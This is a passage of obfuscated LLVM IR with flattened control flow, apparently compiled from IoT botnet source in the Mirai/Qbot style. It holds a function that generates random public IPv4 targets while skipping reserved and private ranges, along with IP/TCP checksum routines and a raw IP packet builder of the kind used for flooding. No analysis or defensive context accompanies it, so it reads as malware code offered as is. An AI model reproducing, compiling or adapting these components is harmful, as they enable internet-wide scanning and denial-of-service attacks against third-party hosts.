    i32 -1576105203, label %20
    i32 2137851856, label %26
    i32 -262337391, label %32
    i32 1442096781, label %38
    i32 -1318695191, label %44
    i32 -123900268, label %50
    i32 -281223303, label %56
    i32 10620720, label %62
    i32 1961058065, label %68
    i32 733394235, label %74
    i32 -556065681, label %80
    i32 -1303920829, label %86
    i32 1910787341, label %92
    i32 941712102, label %98
    i32 -986814848, label %104
    i32 -1056964157, label %110
    i32 -805532808, label %116
    i32 1270702108, label %122
    i32 -785206270, label %128
    i32 1520480341, label %134
    i32 2095275583, label %140
    i32 571953570, label %146
    i32 6083857, label %152
    i32 404554751, label %158
    i32 -1675234036, label %164
    i32 1099828259, label %170
    i32 -39589609, label %176
    i32 -683503857, label %182
    i32 -1622519043, label %188
    i32 -797215722, label %194
    i32 1897722470, label %200
    i32 -529005516, label %206
    i32 961063580, label %212
    i32 -66915693, label %218
    i32 1358986369, label %224
    i32 1028617352, label %230
    i32 -1657492966, label %236
    i32 -1736928244, label %242
    i32 943132124, label %248
    i32 563708485, label %254
    i32 -114697605, label %260
    i32 1519040892, label %266
    i32 -2096575945, label %272
    i32 -730015822, label %278
    i32 703387681, label %284
    i32 -1481370300, label %289
    i32 -360815596, label %290
    i32 1333078266, label %292
    i32 1709488080, label %309
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  %25 = select i1 %24, i32 -360815596, i32 2137851856
  store i32 %25, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 10
  %31 = select i1 %30, i32 -360815596, i32 -262337391
  store i32 %31, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 100
  %37 = select i1 %36, i32 1442096781, i32 -123900268
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp sge i32 %41, 64
  %43 = select i1 %42, i32 -1318695191, i32 -123900268
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %46 = load i8, i8* %45, align 1
  %47 = zext i8 %46 to i32
  %48 = icmp sle i32 %47, 127
  %49 = select i1 %48, i32 -360815596, i32 -123900268
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 127
  %55 = select i1 %54, i32 -360815596, i32 -281223303
  store i32 %55, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 169
  %61 = select i1 %60, i32 10620720, i32 1961058065
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 254
  %67 = select i1 %66, i32 -360815596, i32 1961058065
  store i32 %67, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 172
  %73 = select i1 %72, i32 733394235, i32 -1303920829
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sle i32 %77, 16
  %79 = select i1 %78, i32 -556065681, i32 -1303920829
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp sle i32 %83, 31
  %85 = select i1 %84, i32 -360815596, i32 -1303920829
  store i32 %85, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 192
  %91 = select i1 %90, i32 1910787341, i32 -986814848
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %94 = load i8, i8* %93, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 0
  %97 = select i1 %96, i32 941712102, i32 -986814848
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 2
  %103 = select i1 %102, i32 -360815596, i32 -986814848
  store i32 %103, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 192
  %109 = select i1 %108, i32 -1056964157, i32 1270702108
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 88
  %115 = select i1 %114, i32 -805532808, i32 1270702108
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 99
  %121 = select i1 %120, i32 -360815596, i32 1270702108
  store i32 %121, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 192
  %127 = select i1 %126, i32 -785206270, i32 1520480341
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 168
  %133 = select i1 %132, i32 -360815596, i32 1520480341
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 198
  %139 = select i1 %138, i32 2095275583, i32 6083857
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 18
  %145 = select i1 %144, i32 -360815596, i32 571953570
  store i32 %145, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %148 = load i8, i8* %147, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 19
  %151 = select i1 %150, i32 -360815596, i32 6083857
  store i32 %151, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %154 = load i8, i8* %153, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 198
  %157 = select i1 %156, i32 404554751, i32 1099828259
  store i32 %157, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 51
  %163 = select i1 %162, i32 -1675234036, i32 1099828259
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 100
  %169 = select i1 %168, i32 -360815596, i32 1099828259
  store i32 %169, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 203
  %175 = select i1 %174, i32 -39589609, i32 -1622519043
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 0
  %181 = select i1 %180, i32 -683503857, i32 -1622519043
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 113
  %187 = select i1 %186, i32 -360815596, i32 -1622519043
  store i32 %187, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 62
  %193 = select i1 %192, i32 -797215722, i32 1897722470
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %196 = load i8, i8* %195, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp sle i32 %197, 30
  %199 = select i1 %198, i32 -360815596, i32 1897722470
  store i32 %199, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 207
  %205 = select i1 %204, i32 -529005516, i32 -66915693
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp sge i32 %209, 31
  %211 = select i1 %210, i32 961063580, i32 -66915693
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp sle i32 %215, 120
  %217 = select i1 %216, i32 -360815596, i32 -66915693
  store i32 %217, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 65
  %223 = select i1 %222, i32 1358986369, i32 -1657492966
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp sge i32 %227, 224
  %229 = select i1 %228, i32 1028617352, i32 -1657492966
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp sle i32 %233, 226
  %235 = select i1 %234, i32 -360815596, i32 -1657492966
  store i32 %235, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 195
  %241 = select i1 %240, i32 -1736928244, i32 943132124
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 10
  %247 = select i1 %246, i32 -360815596, i32 943132124
  store i32 %247, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %250 = load i8, i8* %249, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 216
  %253 = select i1 %252, i32 563708485, i32 1519040892
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 25
  %259 = select i1 %258, i32 -360815596, i32 -114697605
  store i32 %259, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %262 = load i8, i8* %261, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp eq i32 %263, 94
  %265 = select i1 %264, i32 -360815596, i32 1519040892
  store i32 %265, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 212
  %271 = select i1 %270, i32 -2096575945, i32 -730015822
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 56
  %277 = select i1 %276, i32 -360815596, i32 -730015822
  store i32 %277, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp sge i32 %281, 224
  %283 = select i1 %282, i32 703387681, i32 -1481370300
  store i32 %283, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %286 = load i8, i8* %285, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp sle i32 %287, 239
  store i32 -1481370300, i32* %switchVar
  store i1 %288, i1* %.reg2mem
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -360815596, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %291 = select i1 %.reload3, i32 1333078266, i32 1709488080
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = call i32 @rand() #2
  %294 = srem i32 %293, 255
  %295 = trunc i32 %294 to i8
  %296 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %295, i8* %296, align 1
  %297 = call i32 @rand() #2
  %298 = srem i32 %297, 255
  %299 = trunc i32 %298 to i8
  %300 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %299, i8* %300, align 1
  %301 = call i32 @rand() #2
  %302 = srem i32 %301, 255
  %303 = trunc i32 %302 to i8
  %304 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %303, i8* %304, align 1
  %305 = call i32 @rand() #2
  %306 = srem i32 %305, 255
  %307 = trunc i32 %306 to i8
  %308 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %307, i8* %308, align 1
  store i32 -1576105203, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %310, i8 0, i64 16, i32 16, i1 false)
  %311 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %312 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %313 = load i8, i8* %312, align 1
  %314 = zext i8 %313 to i32
  %315 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = call i32 (i8*, i8*, ...) @sprintf(i8* %311, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i32 0, i32 0), i32 %314, i32 %317, i32 %320, i32 %323) #2
  %325 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %326 = call i32 @inet_addr(i8* %325) #2
  ret i32 %326

loopEnd:                                          ; preds = %292, %290, %289, %284, %278, %272, %266, %260, %254, %248, %242, %236, %230, %224, %218, %212, %206, %200, %194, %188, %182, %176, %170, %164, %158, %152, %146, %140, %134, %128, %122, %116, %110, %104, %98, %92, %86, %80, %74, %68, %62, %56, %50, %44, %38, %32, %26, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1491835497, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1491835497, label %6
    i32 432920193, label %10
    i32 1481160956, label %19
    i32 1922124165, label %23
    i32 181647991, label %30
    i32 -1229096025, label %31
    i32 -310684080, label %36
    i32 -1686262511, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 432920193, i32 1481160956
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i32
  %15 = load i32, i32* %5, align 4
  %16 = add nsw i32 %15, %14
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -1491835497, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1922124165, i32 181647991
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, %27
  store i32 %29, i32* %5, align 4
  store i32 181647991, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -1229096025, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %5, align 4
  %33 = ashr i32 %32, 16
  %34 = icmp ne i32 %33, 0
  %35 = select i1 %34, i32 -310684080, i32 -1686262511
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %5, align 4
  %38 = and i32 %37, 65535
  %39 = load i32, i32* %5, align 4
  %40 = ashr i32 %39, 16
  %41 = add nsw i32 %38, %40
  store i32 %41, i32* %5, align 4
  store i32 -1229096025, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %5, align 4
  %44 = xor i32 %43, -1
  %45 = trunc i32 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
